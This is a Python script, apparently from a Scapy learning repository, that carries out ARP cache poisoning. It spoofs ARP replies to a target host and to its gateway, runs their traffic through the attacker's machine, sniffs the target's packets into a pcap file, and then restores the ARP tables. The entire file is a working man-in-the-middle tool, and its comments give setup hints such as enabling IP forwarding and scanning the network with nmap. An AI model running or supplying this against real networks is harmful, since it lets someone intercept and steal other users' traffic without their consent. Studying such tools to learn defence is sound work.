import threading
from scapy.all import Ether, ARP, srp, conf, send, sniff, wrpcap  # https://scapy.net/
import time
import sys
import os
import signal

""" 
ARP POISONING 

Quite simply, we will convince a target machine that we have become its gateway, 
and we will also convince the gateway that in order to reach the target machine, 
all traffic has to go through us. Every computer on a network maintains an ARP cache 
that stores the most recent MAC addresses that match to IP
addresses on the local network, and we are going to poison this cache.
"""

# [!] if not working enable packet forwarding on linux: "echo 1 > /proc/sys/net/ipv4/ip_forward"
# [!] to check the sniffed packets "tcpdump -r 00_ARPoisoning_output.pcap | cat"

INTERFACE = "wlp7s0"

GATEWAY_IP = "192.168.1.1"
TARGET_IP = "192.168.1.30" # scan the local netwrok with "nmap -sn 192.168.1.1/24"

PACKET_COUNT = 1000
BPF_FILTER = f"ip host {TARGET_IP}"

OUTPUT_PCAP = "src/04_SCAPY/00_ARPoisoning.pcap"


def get_mac(target_ip):
    """
    Gets the MAC address of a target IP address.

    Sends an ARP request to get the MAC address of the target IP. 

    Constructs an Ethernet broadcast frame with an ARP request.
    Sends the packet and parses the response to extract the MAC address.

    Args:
    target_ip: The IP address to get the MAC for.

    Returns:
    The MAC address of the target IP.

    """

    broadcast = "ff:ff:ff:ff:ff:ff:ff"

    # Ether creates a Ethernet frame to broadcast.
    # ARP asks "who has" the IP address in pdst
    # / is used to concatenate different layers of the packet.
    packet = Ether(dst=broadcast) / ARP(op="who-has", pdst=target_ip)

    # sends the packet to the local network
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)

    # extract the MAC address in the response from the Ethernet frame
    for _, r in resp:
        return r[Ether].src


def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    """
    Performs ARP poisoning between a gateway and target.

    Sends spoofed ARP replies to poison the ARP caches of the gateway and target. 
    Causes traffic between the gateway and target to be sent to this host instead.

    Args:
    gateway_ip: The IP address of the gateway. 
    gateway_mac: The MAC address of the gateway.
    target_ip: The IP address of the target.
    target_mac: The MAC address of the target.
    
    Prints:
    Status messages about the poisoning attack.
    
    """

    # Create the ARP poisoning packet for the target
    poison_target = ARP()
    poison_target.op = 2  # The opcode 2 is used to indicate an ARP reply.
    poison_target.psrc = gateway_ip  # Should seem coming from the gateway
    poison_target.pdst, poison_target.hwdst = (
        target_ip,
        target_mac,
    )  # Specifies the IP/MAC destination to send it

    # Create the ARP poisoning packet for the gateway
    poison_gateway = ARP()
    poison_gateway.op = 2  # The opcode 2 is used to indicate an ARP reply.
    poison_gateway.psrc = target_ip  #  Should seem coming from the target
    poison_gateway.pdst, poison_gateway.hwdst = (
        gateway_ip,
        gateway_mac,
    )  # Specifies the IP/MAC destination to send it

    print("[*] Beginning the ARP poison. [CTRL-C to stop]")

    while True:
        sys.stdout.write(".")
        sys.stdout.flush()
        try:
            send(poison_target)
            send(poison_gateway)
            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
            print("[*] ARP poison attack finished.")
            return


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    """
    Restores the ARP tables of the gateway and target. 

    Sends ARP replies to reset the ARP cache of the gateway and target 
    to their correct MAC and IP addresses.

    Restores networking between the gateway and target after ARP poisoning. 

    Args:
    gateway_ip: The IP address of the gateway.
    gateway_mac: The MAC address of the gateway. 
    target_ip: The IP address of the target.
    target_mac: The MAC address of the target.
    
    """

    print("[*] Restoring target...")
    # restore gateway ARP table
    send(
        ARP(
            op=2,
            psrc=gateway_ip,
            pdst=target_ip,
            hwdst="ff:ff:ff:ff:ff:ff",
            hwsrc=gateway_mac,
        )
    )

    # restore gateway ARP table
    send(
        ARP(
            op=2,
            psrc=target_ip,
            pdst=gateway_ip,
            hwdst="ff:ff:ff:ff:ff:ff",
            hwsrc=target_mac,
        )
    )

    # kill gracefully the thread execution since we're done
    os.kill(os.getpid(), signal.SIGINT)


def main():
    """
    Main function to perform ARP poisoning.

    Gets the gateway and target MAC addresses.
    Starts a thread to poison the ARP caches. 
    Sniffs packets between the gateway and target.
    Writes sniffed packets to a PCAP file.
    Restores ARP tables on exit.

    Configures Scapy and network interface. 
    Prints status messages.

    Args:    None
    Returns: None
    """

    # Setup scapy configurations
    conf.iface = INTERFACE
    conf.verb = 0

    # Retrieve gateway MAC
    gateway_mac = get_mac(GATEWAY_IP)
    if gateway_mac is None:
        print("[!!!] Failed to get gateway MAC. Exiting.")
        sys.exit(0)
    else:
        print(f"[*] Gateway {GATEWAY_IP} is at {gateway_mac}")

    # Retrieve target MAC
    target_mac = get_mac(TARGET_IP)
    if target_mac is None:
        print("[!!!] Failed to get target MAC. Exiting.")
        sys.exit(0)
    else:
        print(f"[*] Target {TARGET_IP} is at {target_mac}")

    # Start poison thread
    poison_thread = threading.Thread(
        target=poison_target, args=(GATEWAY_IP, gateway_mac, TARGET_IP, target_mac)
    )
    poison_thread.start()

    # SNIFF
    try:
        print("[*] Starting sniffer for %d packets" % PACKET_COUNT)
        packets = sniff(
            count=PACKET_COUNT, filter=BPF_FILTER, iface=INTERFACE
        )  # Sniff packets
        wrpcap(OUTPUT_PCAP, packets)  # Write out the captured packets

        # Restore the network
        restore_target(GATEWAY_IP, gateway_mac, TARGET_IP, target_mac)

    except KeyboardInterrupt:
        # Restore the network on keyboard interrupt
        restore_target(GATEWAY_IP, gateway_mac, TARGET_IP, target_mac)
        sys.exit(0)


if __name__ == "__main__":
    main()
